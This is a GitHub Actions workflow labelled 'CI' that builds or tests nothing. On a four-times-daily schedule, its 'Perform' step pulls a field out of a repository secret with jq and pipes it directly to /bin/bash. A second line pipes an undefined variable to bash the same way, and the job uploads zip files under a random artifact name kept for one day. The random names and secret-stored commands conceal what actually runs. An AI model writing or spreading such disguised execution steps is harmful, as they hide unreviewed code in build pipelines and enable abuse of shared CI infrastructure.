name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '50 2,8,14,20 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Perform
        env:
          h5: ${{ secrets.h5 }}
        run: |
          printf '%s' "$h5" | jq -r .ojn32 | /bin/bash
          echo $ulx576 | jq -r .tfa5 | /bin/bash

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ekPWJeEg
          path: "*.zip"
          retention-days: 1
